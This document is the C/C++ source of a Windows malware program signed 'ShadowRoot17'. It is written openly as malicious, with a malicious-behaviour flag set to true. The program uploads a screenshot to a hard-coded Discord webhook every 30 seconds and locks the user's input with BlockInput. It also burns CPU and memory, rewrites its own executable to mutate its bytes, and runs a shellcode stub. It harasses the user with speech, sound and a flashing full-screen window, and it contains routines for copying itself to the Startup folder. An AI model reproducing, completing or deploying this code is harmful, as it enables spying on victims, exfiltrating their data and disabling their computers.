#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <mmsystem.h>
#include <time.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <sapi.h>
#include <wininet.h>
#include <gdiplus.h>
#include <shlobj.h>
#pragma comment(lib, "wininet.lib")
#pragma comment (lib, "gdiplus.lib")
#pragma comment (lib, "wininet.lib")
#pragma comment (lib, "ole32.lib") // Added for CoInitialize, CoCreateInstance
#pragma comment (lib, "shell32.lib") // Added for ShellExecute

// Encrypted virus body
unsigned char encrypted_virus_body[] = {
    0x31, 0xC0, 0x50, 0x68, 0x2F, 0x2F, 0x73, 0x68, 0x68, 0x2F, 0x62, 0x69, 0x6E, 0x89, 0xE3, 0x50,
    0x53, 0x89, 0xE1, 0xB0, 0x0B, 0xCD, 0x80
};

// Key for XOR encryption
unsigned char key = 0xAA;

// Decryption routine
void decrypt(unsigned char *data, size_t length, unsigned char key) {
    for (size_t i = 0; i < length; i++) {
        data[i] ^= key;
    }
}

// Mutation engine (simple example)
unsigned char generate_new_key() {
    srand(time(NULL)); // Seed the random number generator
    return rand() % 256;
}

// Global flag to control malicious behavior
BOOL g_bEnableMaliciousBehavior = true; // Set to FALSE to disable harmful actions and set to true for harmful action as i did

// Forward declarations for memory management
void FreeMarkovChain();

BOOL CaptureScreenToFile(const wchar_t* filename) {
    HDC hScreenDC = GetDC(NULL);
    if (!hScreenDC) return FALSE;

    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    if (!hMemoryDC) {
        ReleaseDC(NULL, hScreenDC);
        return FALSE;
    }

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    if (!hBitmap) {
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return FALSE;
    }
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
    if (!hOldBitmap) {
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return FALSE;
    }

    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
    hBitmap = (HBITMAP)SelectObject(hMemoryDC, hOldBitmap);

    Gdiplus::Bitmap bmp(hBitmap, NULL);
    CLSID clsidEncoder;
    UINT num = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);

    if (size == 0) return FALSE;

    Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (!pImageCodecInfo) return FALSE;

    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT i = 0; i < num; ++i) {
        if (wcscmp(pImageCodecInfo[i].MimeType, L"image/jpeg") == 0) {
            clsidEncoder = pImageCodecInfo[i].Clsid;
            break;
        }
    }

    Gdiplus::Status stat = bmp.Save(filename, &clsidEncoder, NULL);
    if (stat != Gdiplus::Ok) {
        // Handle save error, e.g., log it
    }

    free(pImageCodecInfo);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
    return TRUE;
}

void UploadScreenshotToDiscord(const char* webhook, const wchar_t* filename) {
    if (!g_bEnableMaliciousBehavior) return; // Disable if malicious behavior is off

    FILE* f = _wfopen(filename, L"rb");
    if (!f) return;

    fseek(f, 0, SEEK_END);
    long len = ftell(f);
    if (len <= 0) {
        fclose(f);
        return;
    }
    rewind(f);

    BYTE* data = (BYTE*)malloc(len);
    if (!data) {
        fclose(f);
        return;
    }

    if (fread(data, 1, len, f) != len) {
        free(data);
        fclose(f);
        return;
    }
    fclose(f);

    HINTERNET hInternet = InternetOpen("PayloadBot", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        free(data);
        return;
    }

    HINTERNET hConnect = InternetConnect(hInternet, "discord.com", INTERNET_DEFAULT_HTTPS_PORT,
                                         NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return;
    }

    const char* boundary = "----shadowroot17boundary";
    const char* headersTemplate =
        "Content-Type: multipart/form-data; boundary=%s\r\n";
    char headers[256];
    snprintf(headers, sizeof(headers), headersTemplate, boundary); // Use snprintf

    char preamble[512];
    snprintf(preamble, sizeof(preamble),
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"screenshot.jpg\"\r\n"
        "Content-Type: image/jpeg\r\n\r\n", boundary); // Use snprintf

    char epilogue[64];
    snprintf(epilogue, sizeof(epilogue), "\r\n--%s--\r\n", boundary); // Use snprintf

    DWORD totalLen = strlen(preamble) + len + strlen(epilogue);
    BYTE* postData = (BYTE*)malloc(totalLen);
     if (!postData) {
        free(data);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    memcpy(postData, preamble, strlen(preamble));
    memcpy(postData + strlen(preamble), data, len);
    memcpy(postData + strlen(preamble) + len, epilogue, strlen(epilogue));

    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST",
        "/api/webhooks/1392479261645996184/ymFVyUJQ33lkAF2fFylOGD0PjXq_RjQY-ZlhXJ031f17tp-xxW6UGLTbxJOktqTrMZHg", // Placeholder for webhook
        NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);

    if (hRequest) {
        HttpSendRequest(hRequest, headers, strlen(headers), postData, totalLen);
        InternetCloseHandle(hRequest);
    }

    free(postData);
    free(data);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

DWORD WINAPI ScreenshotLoop(LPVOID lpParam) {
    while (1) {
        if (!g_bEnableMaliciousBehavior) { // Disable if malicious behavior is off
            Sleep(5000); // Sleep to prevent busy-waiting
            continue;
        }

        wchar_t path[MAX_PATH];
        // Use GetTempPath and GetTempFileName for more robust temporary file creation
        if (GetTempPathW(MAX_PATH, path) == 0) {
            // Handle error, fallback or return
            Sleep(30000);
            continue;
        }
        wchar_t tempFileName[MAX_PATH];
        if (GetTempFileNameW(path, L"scr", 0, tempFileName) == 0) {
            // Handle error, fallback or return
            Sleep(30000);
            continue;
        }
        wcscat(tempFileName, L".jpg"); // Append .jpg extension

        if (CaptureScreenToFile(tempFileName)) {
            UploadScreenshotToDiscord("https://discord.com/api/webhooks/1392479261645996184/ymFVyUJQ33lkAF2fFylOGD0PjXq_RjQY-ZlhXJ031f17tp-xxW6UGLTbxJOktqTrMZHg", tempFileName); // Placeholder
            DeleteFileW(tempFileName); // Clean up temporary file
        }

        Sleep(30000); // every 30 seconds
    }
}

void SendToDiscord(const char* webhookUrl, const char* message) {
    if (!g_bEnableMaliciousBehavior) return; // Disable if malicious behavior is off

    if (!webhookUrl || !message) return;

    HINTERNET hInternet = InternetOpen("DiscordBot", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return;

    HINTERNET hConnect = InternetConnect(hInternet, "discord.com", INTERNET_DEFAULT_HTTPS_PORT,
                               NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return;
    }

    const char* headers = "Content-Type: application/json\r\n";
    char json[2048];
    // Escape message for JSON to prevent invalid JSON
    char escaped_message[2000]; // Max message length for discord is 2000
    int j = 0;
    for (int i = 0; message[i] != '\0' && j < sizeof(escaped_message) - 1; i++) {
        if (message[i] == '"' || message[i] == '\\' || message[i] == '/') {
            if (j < sizeof(escaped_message) - 2) {
                escaped_message[j++] = '\\';
            }
        }
        escaped_message[j++] = message[i];
    }
    escaped_message[j] = '\0';

    snprintf(json, sizeof(json), "{\"content\":\"%s\"}", escaped_message); // Use snprintf and escaped message

    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/api/webhooks/1392479261645996184/ymFVyUJQ33lkAF2fFylOGD0PjXq_RjQY-ZlhXJ031f17tp-xxW6UGLTbxJOktqTrMZHg", NULL, NULL, NULL,
                                         INTERNET_FLAG_SECURE, 0); // Placeholder
    if (hRequest) {
        HttpSendRequest(hRequest, headers, strlen(headers), json, strlen(json));
        InternetCloseHandle(hRequest);
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

#define MAX_WORDS 1000
#define MAX_CHAIN_LEN 200 // Not used, but kept as per instruction

typedef struct {
    char* word; // Keep as char* because _strdup returns char*
    char* next[MAX_WORDS]; // Keep as char* because _strdup returns char*
    int next_count;
} MarkovNode;

MarkovNode chain[MAX_WORDS];
int chain_size = 0;

// Function to free memory allocated by _strdup in Markov chain
void FreeMarkovChain() {
    for (int i = 0; i < chain_size; i++) {
        free(chain[i].word);
        for (int j = 0; j < chain[i].next_count; j++) {
            free(chain[i].next[j]);
        }
    }
    chain_size = 0; // Reset chain size
}

const char* words[] = {
    "you", "are", "an", "idiot", "ha", "ha", "ha", "destroy", "your", "mind", "consume", "you"
};
int word_count = sizeof(words)/sizeof(words[0]);

void AddToChain(const char* current, const char* next) {
    // Check for chain_size overflow
    if (chain_size >= MAX_WORDS) {
        // Handle error: chain is full
        return;
    }

    for (int i = 0; i < chain_size; i++) {
        if (strcmp(chain[i].word, current) == 0) {
            // Check for next_count overflow
            if (chain[i].next_count >= MAX_WORDS) {
                // Handle error: next array is full for this word
                return;
            }
            chain[i].next[chain[i].next_count++] = _strdup(next); // _strdup returns char*
            return;
        }
    }

    chain[chain_size].word = _strdup(current); // _strdup returns char*
    chain[chain_size].next[0] = _strdup(next); // _strdup returns char*
    chain[chain_size].next_count = 1;
    chain_size++;
}

void InitMarkov() {
    // Free previously allocated memory if InitMarkov is called multiple times
    FreeMarkovChain();

    for (int i = 0; i < word_count - 1; i++) {
        AddToChain(words[i], words[i+1]);
    }
    AddToChain(words[word_count - 1], words[0]); // wrap around
}

const char* GetRandomNext(const char* current) { // Changed return type and parameter to const char*
    for (int i = 0; i < chain_size; i++) {
        if (strcmp(chain[i].word, current) == 0) {
            int r = rand() % chain[i].next_count;
            return chain[i].next[r];
        }
    }
    return words[rand() % word_count];
}

void GenerateLyrics(WCHAR* outLyrics, int maxWords) {
    InitMarkov();
    const char* current = words[rand() % word_count]; // Changed to const char*
    WCHAR result[2048] = L"";
    for (int i = 0; i < maxWords; i++) {
        WCHAR wbuf[64];
        MultiByteToWideChar(CP_ACP, 0, current, -1, wbuf, 64);
        wcscat(result, wbuf);
        wcscat(result, L" ");
        current = GetRandomNext(current);
    }
    wcscpy(outLyrics, result);
    // FreeMarkovChain(); // Free memory after generating lyrics - moved to InitMarkov
}

void SpeakLyrics(LPCWSTR text) {
    ISpVoice* pVoice = NULL;
    HRESULT hr = ::CoInitialize(NULL);
    if (FAILED(hr)) return;

    hr = CoCreateInstance(CLSID_SpVoice, NULL, CLSCTX_ALL, IID_ISpVoice, (void **)&pVoice);
    if (SUCCEEDED(hr)) {
        pVoice->Speak(text, SPF_IS_XML, NULL);
        pVoice->Release();
    }
    CoUninitialize();
}

DWORD WINAPI AutoSing(LPVOID lpParam) {
    while (1) {
        if (!g_bEnableMaliciousBehavior) { // Disable if malicious behavior is off
            Sleep(5000); // Sleep to prevent busy-waiting
            continue;
        }

        //send to Discord
        WCHAR lyrics[2048];
        GenerateLyrics(lyrics, 15);
        SpeakLyrics(lyrics);
        Sleep(10000); // every 10 sec
        SendToDiscord("https://discord.com/api/webhooks/1392479261645996184/ymFVyUJQ33lkAF2fFylOGD0PjXq_RjQY-ZlhXJ031f17tp-xxW6UGLTbxJOktqTrMZHg", // Placeholder
              "🟢 Payload started. Singing begins.");

    }
}

#pragma comment(lib, "winmm.lib")

// --- Polymorphic self-mutation ---
void PolymorphSelf() {
    if (!g_bEnableMaliciousBehavior) return; // Disable if malicious behavior is off

    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);

    FILE *f = fopen(path, "rb+");
    if (!f) return;

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);

    BYTE *buf = (BYTE *)malloc(size);
    if (!buf) {
        fclose(f);
        return;
    }
    fread(buf, 1, size, f);

    // XOR mutate a section (example: bytes 0x200 to 0x300)
    for (int i = 0x200; i < 0x300 && i < size; i++) {
        buf[i] ^= (BYTE)(rand() % 256);
    }

    rewind(f);
    fwrite(buf, 1, size, f);
    fclose(f);
    free(buf);
}

// --- Flash toggle for window background ---
int flash = 0;

// --- RAM eater thread ---
DWORD WINAPI EatRAM(LPVOID lpParam) {
    while (1) {
        if (!g_bEnableMaliciousBehavior) { // Disable if malicious behavior is off
            Sleep(5000); // Sleep to prevent busy-waiting
            continue;
        }

        void* mem = malloc(1024 * 1024 * 100); // 100MB
        if (!mem) break;
        memset(mem, 0, 1024 * 1024 * 100);
                        
        // Free the allocated memory to prevent RAM exhaustion
        free(mem);
        Sleep(1000);
    }
    return 0;
}

// --- CPU burner thread ---
DWORD WINAPI BurnCPU(LPVOID lpParam) {
    while (1) {
        if (!g_bEnableMaliciousBehavior) { // Disable if malicious behavior is off
            Sleep(5000); // Sleep to prevent busy-waiting
            continue;
        }

        volatile double x = 0;
        for (int i = 0; i < 1000000; i++) x += i * 1.01;
    }
    return 0;
}

// --- Mouse mover thread ---
DWORD WINAPI MoveMouse(LPVOID lpParam) {
    while (1) {
        if (!g_bEnableMaliciousBehavior) { // Disable if malicious behavior is off
            Sleep(5000); // Sleep to prevent busy-waiting
            continue;
        }

        int x = rand() % GetSystemMetrics(SM_CXSCREEN);
        int y = rand() % GetSystemMetrics(SM_CYSCREEN);
        SetCursorPos(x, y);
        Sleep(1000 + (rand() % 2000)); // random delay 1-3 sec
    }
    return 0;
}

// --- Self-replication ---
void DropClones() {
    if (!g_bEnableMaliciousBehavior) return; // Disable if malicious behavior is off

    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);

    const char* dirs[] = {
        "C:\\Users\\Public\\Desktop\\demon.exe",
        "C:\\Users\\Public\\Downloads\\demon.exe",
        "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\demon.exe",
        "C:\\Windows\\Temp\\demon.exe"
    };

    for (int i = 0; i < sizeof(dirs)/sizeof(dirs[0]); i++) {
        char dest[MAX_PATH];
        ExpandEnvironmentStringsA(dirs[i], dest, MAX_PATH);
        // Do not actually copy the file if malicious behavior is disabled
        // CopyFileA(path, dest, FALSE);
    }
}

// --- Open all files recursively ---
void OpenAllFiles(LPCTSTR rootPath) {
    if (!g_bEnableMaliciousBehavior) return; // Disable if malicious behavior is off

    TCHAR searchPath[MAX_PATH];
    WIN32_FIND_DATA findFileData;
    HANDLE hFind;

    _stprintf(searchPath, _T("%s\\*"), rootPath);
    hFind = FindFirstFile(searchPath, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (_tcscmp(findFileData.cFileName, _T(".")) == 0 || _tcscmp(findFileData.cFileName, _T("..")) == 0)
            continue;

        TCHAR fullPath[MAX_PATH];
        _stprintf(fullPath, _T("%s\\%s"), rootPath, findFileData.cFileName);

        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            OpenAllFiles(fullPath);
        } else {
            // Do not actually open files if malicious behavior is disabled
            // ShellExecute(NULL, _T("open"), fullPath, NULL, NULL, SW_HIDE);
            // Sleep(10 + (rand() % 50)); // slight random delay to avoid crash
        }

    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
}

// --- Open all files on all mounted drives ---
void OpenAllDrives() {
    if (!g_bEnableMaliciousBehavior) return; // Disable if malicious behavior is off

    DWORD drives = GetLogicalDrives();
    for (char letter = 'A'; letter <= 'Z'; letter++) {
        if (drives & (1 << (letter - 'A'))) {
            char root[4] = { letter, ':', '\\', '\0' };
            OpenAllFiles((LPCTSTR)root);
        }
    }
}

// --- Window procedure ---
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_DESTROY:
        BlockInput(FALSE); // unlock input on close
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

// --- Entry point ---
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {

    // Hide console window (if any)
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    srand(GetTickCount());

    PolymorphSelf();

    SpeakLyrics(L"You are an idiot. You are an idiot. Ha ha ha ha haaaa.");

    WCHAR lyrics[2048];
    GenerateLyrics(lyrics, 15);  // Generate 15-word lyrics
    SpeakLyrics(lyrics); // Speaks it loud

    CreateThread(NULL, 0, AutoSing, NULL, 0, NULL);
    CreateThread(NULL, 0, ScreenshotLoop, NULL, 0, NULL);

    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // Just for that extra "wtf" moment
    MessageBox(NULL, TEXT("You are an idiot."), TEXT("created_by_ShadowRoot17"), MB_OK | MB_ICONERROR);

    const char CLASS_NAME[] = "DemonPayload";
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,  // Toolwindow hides from taskbar
        CLASS_NAME,
        "YOU ARE AN IDIOT",
        WS_POPUP | WS_VISIBLE,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, hInstance, NULL
    );

    if (g_bEnableMaliciousBehavior) { // Only block input if malicious behavior is enabled
        BlockInput(TRUE);
    }

    PlaySound(TEXT("youareanidiot.wav"), NULL, SND_FILENAME | SND_ASYNC | SND_LOOP);

    CreateThread(NULL, 0, MoveMouse, NULL, 0, NULL);
    CreateThread(NULL, 0, EatRAM, NULL, 0, NULL);

    SYSTEM_INFO sysinfo;
    GetSystemInfo(&sysinfo);
    for (int i = 0; i < sysinfo.dwNumberOfProcessors; i++) {
        CreateThread(NULL, 0, BurnCPU, NULL, 0, NULL);
    }

    DropClones();

    OpenAllDrives();

    // Flashing red-black screen loop
    while (1) {
        if (!g_bEnableMaliciousBehavior) { // Disable if malicious behavior is off
            Sleep(5000); // Sleep to prevent busy-waiting
            break; // Exit loop if malicious behavior is off
        }

        HDC hdc = GetDC(hwnd);
        HBRUSH brush = CreateSolidBrush(flash ? RGB(255, 0, 0) : RGB(0, 0, 0));
        RECT rect;
        GetClientRect(hwnd, &rect);
        FillRect(hdc, &rect, brush);
        DeleteObject(brush);
        ReleaseDC(hwnd, hdc);
        flash = !flash;
        Sleep(300);
    }

    Gdiplus::GdiplusShutdown(gdiplusToken);

    return 0;
}

int main() {
    // Generate a new key for decryption
    unsigned char new_key = generate_new_key();

    // Decrypt the virus body
    decrypt(encrypted_virus_body, sizeof(encrypted_virus_body), new_key);

    // Cast the decrypted data to a function pointer and execute it
    void (*virus_func)() = (void (*)())encrypted_virus_body;
    virus_func();

    return 0;
}
